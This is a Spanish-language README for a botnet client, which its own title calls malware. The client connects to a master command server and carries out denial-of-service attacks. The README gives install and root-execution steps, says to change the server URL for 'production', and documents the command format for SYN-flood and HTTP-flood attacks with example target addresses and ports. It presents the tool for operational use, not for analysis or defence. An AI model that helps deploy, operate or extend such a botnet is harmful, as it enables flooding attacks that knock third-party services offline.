# 🤖 Bot Client - Malware del Cliente que lo convierte en un Bot

Cliente bot simple para conectarse al servidor maestro y ejecutar ataques.

## Instalación

### Opcional activar entorno virtual

### Instalar dependencias:

```bash
pip install -r requirements.txt
```

## Uso

### Ejecución con privilegios root (necesario para Scapy):

```bash
sudo python3 bot_client.py
```

### Para producción (cambiar URL en el código):

```python
# En bot_client.py línea 13:
# En lugar de 'localhost:5001'
```

## 🎯 Tipos de Ataque Soportados

### 1. **SYN-FLOOD** - Inundación de paquetes SYN
```
Comando: ATTACK:SYN-FLOOD:192.168.1.1:443
```

### 2. **HTTP-FLOOD** - Inundación de peticiones HTTP
```
Comando: ATTACK:HTTP-FLOOD:https://target.com:80
```



## 📊 Formato de Comandos desde el Servidor

```
ATTACK:TIPO:TARGET[:PUERTO]
```

```
Comando: ATTACK:SYN-FLOOD:http://target.com:80
         └─────┬────┘ └────┬────┘          └┬┘ 
               │           │                │ 
               │           │                └── Puerto
               │           └─────────────────── Objetivo
               └─────────────────────────────── Tipo de ataque
```

**Ejemplos:**
```bash
ATTACK:SYN-FLOOD:http://example.com                   # Puerto 80 default http
ATTACK:SYN-FLOOD:example.com:443                      # Puerto 443
ATTACK:SYN-FLOOD:192.168.1.1:22                       # Puerto 22
```
